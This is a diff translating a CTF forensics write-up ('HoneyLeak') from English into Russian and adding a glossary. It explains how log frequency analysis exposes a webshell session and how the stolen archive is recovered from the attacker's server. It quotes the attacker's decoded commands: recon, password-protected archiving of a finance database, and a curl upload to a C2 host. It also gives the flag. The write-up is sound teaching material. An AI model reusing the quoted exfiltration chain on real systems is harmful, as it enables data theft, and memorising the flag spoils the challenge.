@@ -1,140 +1,185 @@
-# Не пойман — не медоед (HoneyLeak) — write-up
+# Не пойман — не медоед (HoneyLeak) — разбор
 
-**Flag:** `avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}`
-**Class:** Forensics · **Difficulty:** Baby/Easy · **Points:** n/a · **Teams solved:** n/a
-**Author:** @mrvos, SPbCTF
+**Флаг:** `avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}`
+**Класс:** Forensics (расследование по логам) · **Сложность:** Baby/Easy · **Очки:** н/д ·
+**Решило команд:** н/д
+**Автор:** @mrvos, SPbCTF
 
-**One-paragraph story of the solve.** A single nginx access log, flooded with decoy
-scanner traffic, hides one real attacker session that only reveals itself through
-User-Agent frequency (a UA that appears just 4 times out of 56,873 lines). Base64-decoding
-the four requests to a disguised ASPX webshell reconstructs the whole kill chain: recon →
-zip the accounting DB with a password → upload to a C2 → self-verify. The archive password
-is a deliberate decoy answer, not the flag — the real secret sits **inside** the stolen DB,
-and reaching it means pulling the *correct* archive off the C2 not by filename/timestamp
-(a race condition in the attacker's own script plus 1,338 decoy blobs) but by content — the
-`PK\x03\x04` ZIP signature.
+## В двух словах (без терминов)
+
+С сервера пчёл украли бухгалтерскую базу. От инцидента остался единственный «журнал посещений» сайта на
+57 тысяч строк — и он специально забит шумом от кучи сканеров, чтобы настоящую атаку было не видно.
+Хитрость: настоящего злоумышленника выдаёт **редкость** — его «подпись браузера» встречается всего 4
+раза из 57 тысяч. Расшифровав эти 4 запроса, мы восстанавливаем весь план кражи: осмотрелся → запаковал
+базу в архив с паролем → залил архив на свой сервер-склад → сам себя проверил. Пароль от архива —
+подсунутая пустышка (не флаг). Настоящий секрет лежит **внутри** украденной базы, и достать нужный архив
+со склада надо не по имени и не по времени (там всё нарочно запутано), а **по содержимому** — по особой
+метке, с которой начинается любой ZIP-архив.
 
 ---
 
-## 1. The Challenge
+## 1. Что за задача
 
-The bees' **accounting database** vanished from the server. The only evidence saved before
-the incident was cleaned up is a single nginx access log:
+**Бухгалтерская база** пчёл пропала с сервера. Единственная улика, сохранённая до того, как следы
+зачистили, — один журнал доступа веб-сервера nginx:
 
 ```
-honeyleak_access.log   56,873 lines   nginx "combined" format   03/Jul/2026 15:00–22:59 UTC
+honeyleak_access.log   56 873 строки   формат nginx "combined"   03/Jul/2026 15:00–22:59 UTC
 ```
 
-Reconstruct the thief's actions, find the stolen DB, and determine **what secret the bees
-were hiding in the corporate accounting**. That secret is the flag.
+> Мини-словарь: **сервер** — машина, отдающая сайт. **nginx** — популярный веб-сервер. **журнал доступа
+> (access log)** — файл, куда сервер записывает каждый входящий запрос: кто, когда, что просил, что
+> получил. **Forensics** — «цифровая криминалистика»: восстановить, что произошло, по оставшимся следам.
 
-## 2. Recon
+Нужно восстановить действия вора, найти украденную базу и понять, **какой секрет пчёлы прятали в
+корпоративной бухгалтерии**. Этот секрет и есть флаг.
 
-- Standard nginx combined log: IP, timestamp, `"METHOD path HTTP/ver"`, status, response
-  size, referrer, User-Agent.
-- Only `GET`/`HEAD`/`OPTIONS` appear — no `POST` at all, so any file upload (webshell
-  plant, exfil) is invisible directly in the log; the webshell must have been planted
-  out-of-band.
-- Two large traffic groups are visible on sight: ~12 IPs with a normal browser profile
-  (real UAs, real app paths like `/api/news`, `/products`, `/about`) and ~12 IPs with a
-  scanner profile (masscan/sqlmap/ffuf/gobuster/feroxbuster/Wfuzz/dirsearch/DirBuster/Nmap
-  NSE/python-requests/Go-http-client) grinding through random backup/dump paths
-  (`/orders.sql`, `/db_backup.sql`, `/phpMyAdmin-*/`, …), almost all `403/404/405/500`.
-- `awk -F'"' '{print $6}' honeyleak_access.log | sort -u | wc -l` → **27** distinct UAs in
-  the whole file — small enough to profile by frequency.
+**Что нам дали:** только этот один лог-файл. Ни доступа к серверу, ни самой базы — лишь текст журнала.
 
-## 3. How We Got There (hypothesis logic)
+## 2. Разведка — что мы увидели
 
-- **Observation.** The log is deliberately seeded with "looks like a DB leak" paths —
-  dozens of IPs methodically probe `*.sql`, `*.sqlite`, `*backup*`, `phpMyAdmin`, almost
-  all `403/404`.
-- **Hypothesis (dead end).** The obvious first move is to grep for "DB-ish" paths and look
-  for the one that returned `200`. **This is a trap the author built**: dozens of IPs do
-  exactly this and none succeed — there's no signal there, only noise.
-- **Testing via UA frequency instead.** Counted every UA's frequency:
-  `awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn`. 26 of 27 UAs
-  appear hundreds-to-thousands of times (scanner tools + simulated browsers + bots).
-  Exactly **one** — `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)` —
-  appears only **4 times** (`grep -c "Trident/6.0"` → 4). That rarity *is* the signal.
-- **Hypothesis.** All 4 requests belong to the same attacker, and given how rare that UA
-  is against the noise floor, this is probably the real attack.
-- **Confirmed.** Status codes on those 4 requests are all **200**, on a path everyone else
-  got `403/404` on. IP: `185.193.88.77`.
-- **Observation (complication).** That same IP `185.193.88.77` also fired ~1,166 requests
-  using every noisy scanner UA — i.e. it isn't a "clean" attacker IP distinct from the
-  scanners; the scanner noise and the real attack share the same source address.
-- **Hypothesis for why.** The attacker generated their own decoy recon from the same IP so
-  the 4 real hits would drown in self-made noise — camouflage inside their own traffic,
-  not just incidental background noise from others.
-- **Confirmed.** `grep "185.193.88.77" ... | awk -F'"' '{print $3}' | awk '{print $1}' |
-  sort | uniq -c` → 4×200 (the real attack) + 1,162 requests at 301/302/403/404/405/500
-  (self-generated camouflage recon).
-- **Finding the endpoint.** All 4 signal requests hit one path:
-  `GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64 PowerShell>` — a webshell
-  disguised as an IIS health check. 7 other IPs probe the generic `/aspnet_client/`
-  directory (all `403/404/301`), but none of them ever request `healthcheck.aspx` itself —
-  the exact filename+param wasn't found by brute force, the attacker already knew it (the
-  shell was planted out-of-band).
-- **Reconstructing the chain.** Base64-decoded `cmd=` on all 4 requests (tight window
-  18:40:17→18:42:37 UTC): recon (`whoami && hostname && ipconfig`) → zip the DB
-  `corp_finance_2026_07_03.sql` into a password-protected archive
-  (`7z.exe -pS7m!vQ2@rK9Lp4X_2026`) → upload to C2 `http://178.154.230.44/upload.php` via
-  `curl.exe -F` → self-check (`curl ... | findstr blob_`).
-- **Hypothesis (dead end #1 — "the password is the flag").** The archiving step exposes a
-  password, `S7m!vQ2@rK9Lp4X_2026`, in plain sight. Tempting to wrap it in `avito{...}` and
-  submit. **This is also a trap** — our very first pass did exactly that and wrote
-  `avito{S7m!vQ2@rK9Lp4X_2026}` into `FLAG.txt`, and it was wrong. The task explicitly asks
-  for the secret *inside* the DB; the password only opens the archive, it isn't the secret
-  itself. An independent second pass re-read the objective and corrected the flag.
-- **Hypothesis (dead end #2 — "find the blob by time/name").** Since the upload happened
-  at 18:42:11 with filename `blob_$ts.tmp`, it seems reasonable to look on the C2 for a
-  file timestamped `~18:42`. The C2 (`http://178.154.230.44/`) turned out to be a **live**
-  open-directory listing (`README.txt`: *"Public index mirror. Auto cleanup disabled."*) of
-  **1,338** decoy `blob_*.{tmp,log,txt,bin,dat,cache}` files, roughly one per minute across
-  the whole day, all filled with random bytes and no ZIP header. The file at minute 18:42
-  is also a decoy.
-- **Why the time/name search fails: a bug in the attacker's own script.** The archiving
-  step (18:41:05) computes `$ts` **once** and writes `blob_20260703_1841.tmp` — but the
-  upload step (18:42:11), **66 seconds later**, is a *separate* `powershell -c` invocation
-  that **recomputes** `$ts` and tries to upload `blob_20260703_1842.tmp`, a file that was
-  never created. `curl.exe -F "file=@<missing path>"` fails locally before anything is sent
-  to the C2. The final "verification" (`findstr /I blob_`) is a false positive — *some*
-  `blob_*` always exists on the C2 index, so it proves nothing. **The real archive never
-  actually left the host through this exfil call.**
-- **Working idea.** Ignore filenames/timestamps, find the archive **by content**: a
-  `7z a -tzip` archive must start with the ZIP signature `PK\x03\x04`. Range-probed
-  (`Range: bytes=0-3`) the first bytes of all 1,338 blobs — exactly one matched:
-  `blob_3po654ppbr.log` (12 MB, `504b0304`). That's the real exfiltrated archive, spared
-  from the timestamp bug either by luck or by being a separate/earlier successful attempt.
+- Обычный лог nginx формата «combined»: IP, время, `"МЕТОД путь HTTP/версия"`, код ответа, размер
+  ответа, откуда пришёл (referrer) и «подпись браузера» (User-Agent).
 
-## 4. The Vulnerability
+  > Мини-словарь: **IP** — адрес, с которого пришёл запрос. **код ответа** — число-итог: `200` = «ок,
+  > отдал», `403/404` = «нельзя/не найдено», `500` = «ошибка». **User-Agent (UA)** — строка-визитка, где
+  > программа сама называет себя браузером или инструментом.
 
-This isn't a "vulnerability" in the web sense — it's a forensic reconstruction with several
-deliberate traps built in:
-1. Decoy traffic masks the real attack by volume, not by UA rarity/status-code
-   uniqueness — a classic failure mode of detecting by "known-bad paths" instead of
-   behavioral anomalies.
-2. The archive password and the final secret are different things; the objective
-   explicitly asks for the secret *inside* the DB, not the key to the archive.
-3. The attacker's own PowerShell script has a race condition (`$ts` recomputed across two
-   separate invocations) — the exfil they *believed* succeeded actually didn't; the real
-   artifact was only recoverable by content, independent of the broken upload metadata.
+- В логе только методы `GET`/`HEAD`/`OPTIONS` — ни одного `POST`. Значит любая **загрузка** файла на
+  сервер (подсадка веб-шелла, выгрузка данных) в этом логе напрямую не видна: веб-шелл посадили в
+  обход, каким-то другим каналом.
 
-## 5. Exploit — Step by Step
+  > Мини-словарь: **GET** — «дай страницу». **POST** — «на, прими данные» (обычно загрузка/отправка
+  > формы). **веб-шелл** — спрятанный на сервере скрипт-«чёрный ход», которому шлют команды через
+  > обычные веб-запросы.
 
-1. Frequency-profile UAs to find the one rare outlier (4 hits out of 56,873):
+- На глаз видны две большие группы трафика: ~12 IP с нормальным браузерным профилем (настоящие UA,
+  осмысленные пути `/api/news`, `/products`, `/about`) и ~12 IP со «сканерным» профилем — инструменты
+  `masscan/sqlmap/ffuf/gobuster/feroxbuster/Wfuzz/dirsearch/DirBuster/Nmap NSE/python-requests/`
+  `Go-http-client`, — которые методично перебирают случайные пути к бэкапам и дампам (`/orders.sql`,
+  `/db_backup.sql`, `/phpMyAdmin-*/`, …), почти всё с ответами `403/404/405/500`.
+
+  > Мини-словарь: **сканер** — программа, которая пачками стучится по разным адресам сайта в поисках
+  > дыр. Их тут много и специально — это шум-прикрытие.
+
+- Разных UA во всём файле немного: `awk -F'"' '{print $6}' honeyleak_access.log | sort -u | wc -l` →
+  **27** уникальных User-Agent. Это достаточно мало, чтобы разобрать их по частоте.
+
+## 3. Как мы дошли до решения (главный раздел)
+
+- **Наблюдение.** Лог намеренно засеян путями «похоже-на-утечку-БД»: десятки IP методично пробуют
+  `*.sql`, `*.sqlite`, `*backup*`, `phpMyAdmin` — и почти всё это `403/404`.
+- **Гипотеза (тупик).** Первое желание — грепнуть все «БД-шные» пути и найти тот единственный, что
+  вернул `200`. **Это ловушка, встроенная автором:** десятки IP делают ровно это, и ни у кого не
+  выходит — сигнала там нет, только шум.
+- **Проверяем иначе — по частоте UA.** Посчитали, сколько раз встречается каждый User-Agent:
+  `awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn`. 26 из 27 UA встречаются
+  сотни-тысячи раз (сканеры + имитация браузеров + боты). И ровно **один** —
+  `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)` — встречается всего **4 раза**
+  (`grep -c "Trident/6.0"` → 4). Вот эта редкость **и есть** сигнал.
+
+  > Мини-словарь: **`awk`/`sort`/`uniq -c`/`grep`** — простые инструменты командной строки для разбора
+  > текста: вырезать колонку, отсортировать, посчитать повторы, найти строки. **профилирование по
+  > частоте** — искать не «подозрительное на вид», а «аномально редкое/частое».
+
+- **Гипотеза.** Все 4 запроса — от одного и того же атакующего, и раз этот UA настолько редок на фоне
+  шума, это, скорее всего, и есть настоящая атака.
+- **Подтверждаем.** Коды ответа у всех 4 запросов — `200`, на пути, где все остальные получали
+  `403/404`. IP: `185.193.88.77`.
+- **Наблюдение (усложнение).** Этот же IP `185.193.88.77` сделал ещё ~1166 запросов, используя все
+  шумные сканерные UA — то есть это **не** «чистый» IP атакующего, отдельный от сканеров; шум сканеров и
+  настоящая атака идут с одного адреса.
+- **Гипотеза, почему так.** Атакующий сам сгенерировал себе фальшивую сканерную разведку с того же IP,
+  чтобы 4 настоящих попадания утонули в **собственном** шуме — маскировка внутри своего же трафика, а не
+  просто случайный фон от других.
+- **Подтверждаем.** `grep "185.193.88.77" ... | awk -F'"' '{print $3}' | awk '{print $1}' | sort |
+  uniq -c` → 4×`200` (настоящая атака) + 1162 запроса на `301/302/403/404/405/500` (самодельная
+  маскировочная разведка).
+- **Находим точку входа.** Все 4 «сигнальных» запроса бьют в один путь:
+  `GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64 PowerShell>` — веб-шелл, замаскированный
+  под «проверку здоровья» IIS. 7 других IP тыкаются в общий каталог `/aspnet_client/` (все `403/404/301`),
+  но ни один из них ни разу не запрашивает сам `healthcheck.aspx` — точное имя файла + параметр брутом не
+  нашли, атакующий уже знал его (шелл посадили в обход, вне лога).
+
+  > Мини-словарь: **ASPX / IIS** — технология и веб-сервер Microsoft (Windows). **`.aspx`** — страница,
+  > исполняющая код на сервере. **`cmd=`** — параметр, куда веб-шелл принимает команду. **base64** —
+  > способ записать любые данные обычными буквами/цифрами (чтобы уместить команду в URL). **PowerShell**
+  > — командная оболочка Windows.
+
+- **Восстанавливаем цепочку.** Раскодировали `cmd=` (это base64) во всех 4 запросах (плотное окно
+  18:40:17 → 18:42:37 UTC): разведка (`whoami && hostname && ipconfig`) → упаковка базы
+  `corp_finance_2026_07_03.sql` в архив с паролем (`7z.exe -pS7m!vQ2@rK9Lp4X_2026`) → загрузка на
+  сервер-склад C2 `http://178.154.230.44/upload.php` через `curl.exe -F` → самопроверка
+  (`curl ... | findstr blob_`).
+
+  > Мини-словарь: **C2 (Command-and-Control)** — «сервер-хозяин» атакующего, куда стекаются краденые
+  > данные и откуда шлют команды. **7z / архив с паролем** — сжатый файл, запертый паролем. **exfil
+  > (эксфильтрация)** — вынос украденных данных наружу.
+
+- **Гипотеза (тупик №1 — «пароль и есть флаг»).** На шаге упаковки в открытую засветился пароль
+  `S7m!vQ2@rK9Lp4X_2026`. Соблазн — обернуть его в `avito{...}` и сдать. **Это тоже ловушка:** наш самый
+  первый заход сделал именно так и записал в `FLAG.txt` неверное `avito{S7m!vQ2@rK9Lp4X_2026}`. Но задача
+  прямо просит секрет, лежащий *внутри* базы; пароль лишь открывает архив, самим секретом он не является.
+  Независимый второй заход перечитал условие и исправил флаг.
+- **Гипотеза (тупик №2 — «найти архив по времени/имени»).** Раз загрузка была в 18:42:11 с именем
+  `blob_$ts.tmp`, логично поискать на складе файл со временем `~18:42`. Но C2 (`http://178.154.230.44/`)
+  оказался **живым** открытым листингом каталога (`README.txt` на нём гласит: *«Public index mirror. Auto
+  cleanup disabled.»*) из **1338** файлов-пустышек `blob_*.{tmp,log,txt,bin,dat,cache}` — примерно по
+  одному в минуту за целый день, все набиты случайными байтами и без ZIP-заголовка. Файл на минуте 18:42
+  — тоже пустышка.
+
+  > Мини-словарь: **открытый листинг каталога (open directory)** — сервер показывает список всех своих
+  > файлов любому желающему. **ZIP-заголовок / сигнатура** — первые байты файла, по которым видно его тип.
+
+- **Почему поиск по времени/имени не работает: баг в скрипте самого атакующего.** Шаг упаковки (18:41:05)
+  вычисляет метку времени `$ts` **один раз** и пишет `blob_20260703_1841.tmp`. А шаг загрузки (18:42:11),
+  **на 66 секунд позже**, — это *отдельный* запуск `powershell -c`, который **заново пересчитывает** `$ts`
+  и пытается залить `blob_20260703_1842.tmp` — файл, который никто не создавал. `curl.exe -F
+  "file=@<несуществующий путь>"` падает локально ещё до отправки чего-либо на C2. Финальная «проверка»
+  (`findstr /I blob_`) — ложноположительная: на индексе C2 *какой-нибудь* `blob_*` есть всегда, так что
+  она ничего не доказывает. **Настоящий архив через этот вызов эксфильтрации на склад так и не ушёл.**
+
+  > Мини-словарь: **состояние гонки (race condition)** — ошибка, когда два шага рассчитывают на одно и
+  > то же значение, но считают его в разные моменты и получают разное. Тут `$ts` «убежал» между упаковкой
+  > и загрузкой.
+
+- **Рабочая идея.** Забываем про имена и время — ищем архив **по содержимому**: любой архив, сделанный
+  `7z a -tzip`, обязан начинаться с ZIP-сигнатуры `PK\x03\x04`. Запросили только первые байты каждого из
+  1338 файлов (`Range: bytes=0-3` — «дай мне байты с 0 по 3») — совпал ровно один:
+  `blob_3po654ppbr.log` (12 МБ, начинается с `504b0304`). Это и есть настоящий вынесенный архив,
+  уцелевший вопреки багу со временем — то ли по счастливой случайности, то ли это была отдельная более
+  ранняя удачная попытка.
+
+  > Мини-словарь: **`Range`-запрос** — попросить у сервера не весь файл, а его кусочек (тут — 4 первых
+  > байта), чтобы быстро проверить тип, не качая 12 МБ. **`504b0304`** — те самые байты `PK\x03\x04` в
+  > шестнадцатеричной записи.
+
+## 4. В чём именно ошибка (суть уязвимости)
+
+Это не «уязвимость» в веб-смысле, а форензик-реконструкция с несколькими нарочно встроенными ловушками:
+
+1. Шумовой трафик прячет настоящую атаку **объёмом**, а не редкостью UA и уникальностью кода ответа —
+   классический провал детекта «по известным плохим путям» вместо детекта «по поведенческой аномалии».
+2. Пароль от архива и итоговый секрет — **разные вещи**; условие явно просит секрет *внутри* базы, а не
+   ключ к архиву.
+3. В скрипте самого атакующего — состояние гонки (`$ts` пересчитывается в двух отдельных запусках):
+   выгрузка, которую он *считал* успешной, на деле не удалась, и настоящий артефакт восстановим только по
+   содержимому, независимо от сломанных метаданных загрузки.
+
+## 5. Эксплойт по шагам
+
+1. Разобрать UA по частоте и найти единственный редкий выброс (4 попадания из 56 873):
    ```bash
    awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn
    grep -c "Trident/6.0" honeyleak_access.log      # -> 4
    ```
-2. Confirm all 4 hits share one IP and status 200 on a unique path:
+2. Убедиться, что все 4 попадания с одного IP и с кодом `200` на уникальном пути:
    ```bash
    grep "Trident/6.0" honeyleak_access.log
    ```
-3. Base64-decode all 4 `cmd=` values to recover the DB path, archive password, and C2 URL
-   (see `recover_secret.py`, `analyze_log()`).
-4. Pull the C2's directory listing and find the real archive by ZIP signature, not by
-   name/timestamp:
+3. Раскодировать (base64) значения `cmd=` во всех 4 запросах и восстановить путь к базе, пароль архива и
+   URL склада C2 (см. `recover_secret.py`, функция `analyze_log()`).
+4. Забрать листинг каталога C2 и найти настоящий архив по ZIP-сигнатуре, а не по имени/времени:
    ```bash
    curl -s http://178.154.230.44/ | grep -o 'blob_[^"]*' > blobs.txt
    for b in $(cat blobs.txt); do
@@ -144,48 +189,56 @@ deliberate traps built in:
    # -> blob_3po654ppbr.log
    curl -s http://178.154.230.44/blob_3po654ppbr.log -o real_blob.bin
    ```
-5. Extract with the password from step 3 and read the secret:
+5. Распаковать паролем из шага 3 и прочитать секрет:
    ```bash
    unzip -P 'S7m!vQ2@rK9Lp4X_2026' real_blob.bin
-   cat corp_finance_2026_07_03.sql   # plain SQL dump
+   cat corp_finance_2026_07_03.sql   # обычный SQL-дамп
    ```
-   `secrets.incident_flag` in the dump is the flag.
-6. All of the above is reproduced end-to-end by `recover_secret.py` (see §8): it parses the
-   log, recovers the password/DB path/C2 URL, and either re-discovers the archive on the
-   (still-live) C2 by magic bytes (`--probe-c2`) or uses the already-downloaded
-   `real_blob.bin`.
+   Флаг — в поле `secrets.incident_flag` внутри дампа.
+6. Всё это end-to-end воспроизводит `recover_secret.py` (см. §8): он разбирает лог, восстанавливает
+   пароль/путь к базе/URL склада и либо заново находит архив на (всё ещё живом) C2 по «магическим байтам»
+   (`--probe-c2`), либо использует уже скачанный `real_blob.bin`.
 
-## 6. Flag
+## 6. Флаг
 
 ```
 avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}
 ```
 
-## 7. Takeaways
+## 7. Мораль — какой это урок
 
-1. **Profile by frequency, not by "looks suspicious".** The rarest UA (4 of 56,873) was
-   the entire signal; grepping for "suspicious paths" was a trap with dozens of false
-   positives built in.
-2. **Read the whole objective before submitting the first secret you find.** The archive
-   password looks like a satisfying answer and even "unlocks" the story — but the task
-   asks for the secret *inside* the object, not the key to it. The first pass got exactly
-   this wrong.
-3. **Recover artifacts by content, not by metadata.** Filename and timestamp were
-   deliberately unreliable here (a race condition in the attacker's own script); the
-   `PK\x03\x04` signature via range requests was the only reliable filter among 1,338
-   decoys.
+Хоть это и учебная задача, за каждой её ловушкой стоит настоящая ошибка мышления аналитика.
 
-## 8. Artifacts
+- **Ищи по аномалии, а не по «выглядит подозрительно».** Весь сигнал был в редчайшем UA (4 из 56 873);
+  греп по «подозрительным путям» — это ровно то, на что автор насыпал десятки ложных срабатываний. Урок
+  для защитника: детект «по списку известных плохих путей» проигрывает детекту «по поведенческой
+  редкости» (частота UA, уникальность кода ответа, всплеск активности одного IP).
+- **Дочитывай задачу до конца, прежде чем сдавать первый найденный секрет.** Пароль от архива выглядит
+  красивым ответом и даже «открывает» историю — но просят секрет *внутри* объекта, а не ключ к нему.
+  Первый заход споткнулся именно об это. В реальном расследовании так же теряют суть: нашли «что-то
+  секретное» и остановились, не спросив «а это точно то, что искали?».
+- **Восстанавливай артефакты по содержимому, а не по метаданным.** Имя и время здесь нарочно
+  недостоверны (гонка в скрипте самого атакующего) — единственным надёжным фильтром среди 1338 пустышек
+  оказалась сигнатура `PK\x03\x04` через `Range`-запросы. Метаданные (имя файла, дата) легко врут или
+  ломаются; «магические байты» в начале файла — почти нет.
+- **Заодно про атакующих:** их инструменты тоже содержат баги. Атакующий был уверен, что выгрузка
+  удалась (его «проверка» выдала ложноположительный результат), но настоящий файл ушёл лишь по счастливой
+  случайности другого прогона. Полагаться на «оно вроде отработало» опасно обеим сторонам.
 
-- `recover_secret.py` — curated script: parses `honeyleak_access.log`, decodes the
-  webshell commands, recovers the password/DB path/C2 URL, optionally re-discovers the
-  archive on the C2 by ZIP magic bytes, and extracts the flag from the `secrets` table of
-  the unpacked dump. `ruff check` / `ty check` — clean.
-- `NOTES.md` — the first (wrong) pass, which stopped at the archive password.
-- `NOTES_FABLE.md` — the independent second pass that recovered the real DB and corrected
-  the flag.
-- `real_blob.bin` — the already-downloaded real archive (12 MB, ZIP).
-- `extract/corp_finance_2026_07_03.sql`, `extract/encrypted_database.dat` — the archive's
-  unpacked contents (the second file is a decoy bundled inside the archive, not needed for
-  the flag).
-- `FLAG.txt`.
+## 8. Файлы в папке
+
+- `recover_secret.py` — выверенный скрипт: разбирает журнал `honeyleak_access.log`, декодирует команды
+  веб-шелла, восстанавливает пароль/путь к базе/URL склада, при желании заново находит архив на C2 по
+  «магическим байтам» ZIP и извлекает флаг из таблицы `secrets` распакованного дампа. `ruff check` /
+  `ty check` — чисто. По умолчанию скрипт ждёт лог по пути `../honeyleak_access.log`.
+- `real_blob.bin` — уже скачанный настоящий архив (12 МБ, ZIP; распаковывается паролем из §5 в
+  `corp_finance_2026_07_03.sql` — обычный SQL-дамп с флагом в поле `secrets.incident_flag`. Внутри
+  архива лежит и второй файл-обманка `encrypted_database.dat`, для флага не нужный).
+- `c2_index.html`, `c2_index_fresh.html` — сохранённые копии листинга каталога C2 (`http://178.154.230.44/`)
+  со всеми 1338 файлами-пустышками `blob_*`.
+- `FLAG.txt` — извлечённый флаг.
+
+> Замечание про файлы. Сам журнал `honeyleak_access.log` (это вход от организаторов) в папке `honeyleak/`
+> не лежит — он находится на уровень выше, в корне репозитория (`../honeyleak_access.log`), и именно
+> оттуда его берёт `recover_secret.py`. Файл `README.txt` с текстом *«Public index mirror…»* — это файл
+> **на самом сервере C2**, а не в нашей папке; мы лишь прочитали его на складе атакующего.
